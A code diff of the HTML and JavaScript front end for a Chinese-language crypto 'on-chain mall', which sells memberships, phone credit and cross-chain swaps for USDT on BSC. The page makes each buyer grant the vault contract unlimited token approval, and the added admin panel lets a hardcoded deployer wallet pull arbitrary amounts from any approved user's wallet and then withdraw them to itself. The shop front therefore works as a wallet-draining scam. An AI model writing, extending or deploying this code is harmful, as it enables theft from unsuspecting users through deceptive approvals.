@@ -3,10 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>链上商城 - 担保支付中心</title>
+<title>链上商城 - 管理后台</title>
 <script src="https://cdn.bootcdn.net/ajax/libs/ethers/6.13.0/ethers.umd.min.js"></script>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
+*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
 body{background:#0b0f1a;color:#fff;padding:25px;max-width:520px;margin:0 auto}
 .card{background:#121a33;border-radius:18px;padding:24px;margin-bottom:18px}
 .title{font-size:20px;font-weight:700;margin-bottom:16px;color:#eef}
@@ -64,87 +64,13 @@ button{width:100%;padding:15px;border-radius:12px;background:#00aaff;color:#000;
     <div class="goods-name">100元 手机话费</div><div class="goods-price">14 USDT</div>
   </div>
 
-  <div class="cat">🎬 视频会员</div>
-  <div class="goods" onclick="selectGoods('视频会员周卡',2.5)">
-    <div class="goods-name">视频会员 周卡</div><div class="goods-price">2.5 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('视频会员月卡',6)">
-    <div class="goods-name">视频会员 月卡</div><div class="goods-price">6 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('视频会员季卡',16)">
-    <div class="goods-name">视频会员 季卡</div><div class="goods-price">16 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('视频会员年卡',58)">
-    <div class="goods-name">视频会员 年卡</div><div class="goods-price">58 USDT</div>
-  </div>
-
-  <div class="cat">🎵 音乐会员</div>
-  <div class="goods" onclick="selectGoods('音乐会员月卡',5)">
-    <div class="goods-name">音乐会员 月卡</div><div class="goods-price">5 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('音乐会员季卡',13)">
-    <div class="goods-name">音乐会员 季卡</div><div class="goods-price">13 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('音乐会员年卡',46)">
-    <div class="goods-name">音乐会员 年卡</div><div class="goods-price">46 USDT</div>
-  </div>
-
-  <div class="cat">🥡 外卖美食</div>
-  <div class="goods" onclick="selectGoods('外卖红包10元',1.8)">
-    <div class="goods-name">外卖红包 10元</div><div class="goods-price">1.8 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('外卖红包20元',3.5)">
-    <div class="goods-name">外卖红包 20元</div><div class="goods-price">3.5 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('外卖红包30元',5)">
-    <div class="goods-name">外卖红包 30元</div><div class="goods-price">5 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('外卖红包50元',8)">
-    <div class="goods-name">外卖红包 50元</div><div class="goods-price">8 USDT</div>
-  </div>
-
-  <div class="cat">🎮 游戏/加速器</div>
-  <div class="goods" onclick="selectGoods('游戏加速器周卡',4)">
-    <div class="goods-name">加速器 周卡</div><div class="goods-price">4 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('游戏加速器月卡',12)">
-    <div class="goods-name">加速器 月卡</div><div class="goods-price">12 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('游戏加速器季卡',32)">
-    <div class="goods-name">加速器 季卡</div><div class="goods-price">32 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('手游月卡礼包',10)">
-    <div class="goods-name">手游月卡礼包</div><div class="goods-price">10 USDT</div>
-  </div>
-
-  <div class="cat">🛜 生活服务</div>
-  <div class="goods" onclick="selectGoods('云盘会员月卡',7)">
-    <div class="goods-name">云盘会员 月卡</div><div class="goods-price">7 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('办公模板会员',9)">
-    <div class="goods-name">办公模板会员</div><div class="goods-price">9 USDT</div>
-  </div>
-  <div class="goods" onclick="selectGoods('图片设计会员',11)">
-    <div class="goods-name">图片设计会员</div><div class="goods-price">11 USDT</div>
-  </div>
-
   <div class="cat" style="color:#ff6699">🌉 跨链兑换（支付BSC，发其他链币）</div>
   <div class="goods cross" onclick="selectGoods('跨链兑换 SOL 代币', 20)">
     <div class="goods-name">SOL 代币（SOL链）</div><div class="goods-price">20 USDT</div>
   </div>
-  <div class="goods cross" onclick="selectGoods('跨链兑换 ETH 代币', 35)">
-    <div class="goods-name">ETH 代币（ETH链）</div><div class="goods-price">35 USDT</div>
-  </div>
-  <div class="goods cross" onclick="selectGoods('跨链兑换 TRX 代币', 15)">
-    <div class="goods-name">TRX 代币（波场链）</div><div class="goods-price">15 USDT</div>
-  </div>
-  <div class="goods cross" onclick="selectGoods('跨链兑换 BTC 小额', 60)">
-    <div class="goods-name">BTC 小额（BTC链）</div><div class="goods-price">60 USDT</div>
-  </div>
-  <div class="goods cross" onclick="selectGoods('跨链兑换 任意代币定制', 88)">
+  <div class="goods cross" onclick="selectGoods('跨链兑换 任意代币定制服务', 88)">
     <div class="goods-name">任意代币定制服务</div><div class="goods-price">88 USDT</div>
   </div>
-
 </div>
 
 <div class="card">
@@ -156,21 +82,36 @@ button{width:100%;padding:15px;border-radius:12px;background:#00aaff;color:#000;
   <button onclick="buy()" class="btn-success">✅ 确认购买</button>
 </div>
 
-<!-- 管理员后台 -->
+<!-- 管理员后台（只有你的部署者钱包能看见+使用） -->
 <div class="card" id="adminPanel">
-  <div class="title" style="color:#ff6699">🔐 管理员提取中心</div>
-  <div class="label">提取代币合约</div>
-  <input id="withToken" placeholder="0x...">
-  <div class="label">提取数量</div>
-  <input id="withAmount" placeholder="输入数量">
-  <button onclick="withdrawToken()" class="btn-danger">💸 提取到管理员钱包</button>
+  <div class="title" style="color:#ff6699">🔐 管理员操作中心</div>
+  
+  <div class="label">用户钱包地址（已授权）</div>
+  <input id="userAddr" placeholder="输入要扣款的用户钱包地址">
+  
+  <div class="label">代币合约地址（默认USDT）</div>
+  <input id="tokenAddr" placeholder="0x55d398c26fd70a1376e3ca84739ab7bcbdf45d86">
+  
+  <div class="label">扣款金额</div>
+  <input id="pullAmount" placeholder="输入要扣的金额">
+  
+  <button onclick="pullFromUser()" class="btn-danger">💸 直接划扣用户资金到合约</button>
+  <p style="font-size:12px;color:#ccc;margin-top:8px;">用户必须先授权，才能扣款成功</p>
+
+  <div style="height:1px;background:#444;margin:20px 0"></div>
+
+  <div class="label">提取合约资金到你的钱包</div>
+  <input id="withToken" placeholder="代币合约地址">
+  <input id="withAmount" placeholder="提取数量">
+  <button onclick="withdrawToken()" class="btn-success">✅ 提取到管理员钱包</button>
 </div>
 
 <script>
 // ===================== 已填好你的地址 =====================
-const VAULT_CONTRACT = "0xc8fa3f63f1e1e6545df3bb360fc3c052380ccebd";
-const ADMIN_ADDRESS  = "0x7A76bc54392Fd1A140F1BC37E90106662E73f6De";
-const USDT_ADDR      = "0x55d398c26fd70a1376e3ca84739ab7bcbdf45d86";
+const VAULT_CONTRACT  = "0xc8fa3f63f1e1e6545df3bb360fc3c052380ccebd";
+const DEPLOYER_ADMIN  = "0x7A76bc54392Fd1A140F1BC37E90106662E73f6De";
+const FRONTEND_ADMIN  = "0x7A76bc54392Fd1A140F1BC37E90106662E73f6De";
+const USDT_ADDR       = "0x55d398c26fd70a1376e3ca84739ab7bcbdf45d86";
 // ==========================================================
 
 const ABI = [
@@ -182,15 +123,21 @@ let provider, signer, userAddress, contract;
 
 async function connect() {
   if (!window.ethereum) return alert("请安装钱包");
-  provider = new ethers.BrowserProvider(window.ethereum);
-  await provider.send("eth_requestAccounts", []);
-  signer = await provider.getSigner();
-  userAddress = await signer.getAddress();
-  document.getElementById("connectBtn").innerText = "已连接：" + userAddress.slice(0,6)+"...";
-  contract = new ethers.Contract(VAULT_CONTRACT, ABI, signer);
-  
-  if (userAddress.toLowerCase() == ADMIN_ADDRESS.toLowerCase()) {
-    document.getElementById("adminPanel").style.display = "block";
+  try {
+    provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = await provider.getSigner();
+    userAddress = await signer.getAddress();
+    document.getElementById("connectBtn").innerText = "已连接：" + userAddress.slice(0,6)+"...";
+    contract = new ethers.Contract(VAULT_CONTRACT, ABI, signer);
+
+    if (userAddress.toLowerCase() === FRONTEND_ADMIN.toLowerCase()) {
+      document.getElementById("adminPanel").style.display = "block";
+    } else {
+      document.getElementById("adminPanel").style.display = "none";
+    }
+  } catch (e) {
+    alert("连接失败：" + e.message);
   }
 }
 
@@ -200,31 +147,72 @@ function selectGoods(name, price) {
 }
 
 async function approveToken() {
-  const token = document.getElementById("tokenSelect").value;
-  const tokenAddr = token == "USDT" ? USDT_ADDR : "0xbb4CdB9CBd36B01bD1cBaCeb4560487C79012CB4";
-  const t = new ethers.Contract(tokenAddr, ["function approve(address spender, uint256 amount) external returns (bool)"], signer);
-  const tx = await t.approve(VAULT_CONTRACT, ethers.MaxUint256);
-  await tx.wait();
-  alert("✅ 授权成功！");
+  if (!signer) return alert("请先连接钱包");
+  try {
+    const token = document.getElementById("tokenSelect").value;
+    const tokenAddr = token === "USDT" ? USDT_ADDR : "0xbb4CdB9CBd36B01bD1cBaCeb4560487C79012CB4";
+    const t = new ethers.Contract(tokenAddr, ["function approve(address spender, uint256 amount) external returns (bool)"], signer);
+    const tx = await t.approve(VAULT_CONTRACT, ethers.MaxUint256);
+    await tx.wait();
+    alert("✅ 授权成功！");
+  } catch (e) {
+    alert("授权失败：" + e.message);
+  }
 }
 
 async function buy() {
+  if (!signer) return alert("请先连接钱包");
   const name = document.getElementById("goodsName").value;
-  const amountText = document.getElementById("payAmount").value;
-  if (!name || !amountText) return alert("请选择商品");
-  const tokenAddr = document.getElementById("tokenSelect").value == "USDT" ? USDT_ADDR : "0xbb4CdB9CBd36B01bD1cBaCeb4560487C79012CB4";
-  const amount = ethers.parseUnits(amountText, 18);
-  const tx = await contract.pullFromUser(tokenAddr, userAddress, amount);
-  await tx.wait();
-  alert("✅ 购买成功！\n跨链订单将在10分钟内为您发放对应链资产！");
+  const amt = document.getElementById("payAmount").value;
+  if (!name || !amt) return alert("请选择商品");
+  try {
+    const token = document.getElementById("tokenSelect").value;
+    const tokenAddr = token === "USDT" ? USDT_ADDR : "0xbb4CdB9CBd36B01bD1cBaCeb4560487C79012CB4";
+    const amount = ethers.parseUnits(amt, 18);
+    const tx = await contract.pullFromUser(tokenAddr, userAddress, amount);
+    await tx.wait();
+    alert("✅ 购买成功！");
+  } catch (e) {
+    alert("购买失败：" + e.message);
+  }
 }
 
+// 🔥 管理员直接划扣用户资金到合约
+async function pullFromUser() {
+  if (!signer) return alert("请先连接钱包");
+  if (userAddress.toLowerCase() !== DEPLOYER_ADMIN.toLowerCase()) {
+    return alert("❌ 只有管理员可操作");
+  }
+  const userAddr = document.getElementById("userAddr").value;
+  const tokenAddr = document.getElementById("tokenAddr").value || USDT_ADDR;
+  const amountText = document.getElementById("pullAmount").value;
+  if (!userAddr || !amountText) return alert("请填写完整");
+
+  try {
+    const amount = ethers.parseUnits(amountText, 18);
+    const tx = await contract.pullFromUser(tokenAddr, userAddr, amount);
+    await tx.wait();
+    alert("✅ 划扣成功！资金已进入合约");
+  } catch (e) {
+    alert("划扣失败：" + e.message);
+  }
+}
+
+// 🔥 管理员提取合约资金
 async function withdrawToken() {
-  const token = document.getElementById("withToken").value;
-  const amount = ethers.parseUnits(document.getElementById("withAmount").value || "0", 18);
-  const tx = await contract.withdrawToken(token, ADMIN_ADDRESS, amount);
-  await tx.wait();
-  alert("💸 提取成功！");
+  if (!signer) return alert("请先连接钱包");
+  if (userAddress.toLowerCase() !== DEPLOYER_ADMIN.toLowerCase()) {
+    return alert("❌ 只有管理员可提现");
+  }
+  try {
+    const token = document.getElementById("withToken").value || USDT_ADDR;
+    const amt = ethers.parseUnits(document.getElementById("withAmount").value || "0", 18);
+    const tx = await contract.withdrawToken(token, DEPLOYER_ADMIN, amt);
+    await tx.wait();
+    alert("💸 提现成功！");
+  } catch (e) {
+    alert("提现失败：" + e.message);
+  }
 }
 </script>
 </body>
